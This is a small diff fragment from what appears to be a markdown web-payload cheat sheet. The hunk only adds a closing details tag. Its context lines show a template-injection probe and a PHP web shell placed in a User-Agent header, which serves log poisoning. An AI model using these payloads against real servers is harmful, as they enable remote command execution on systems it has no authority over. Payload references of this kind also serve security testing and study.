@@ -930,6 +930,7 @@ User-Agent: {{7*7}}
 ```http
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
+</details>
 
 ---
 
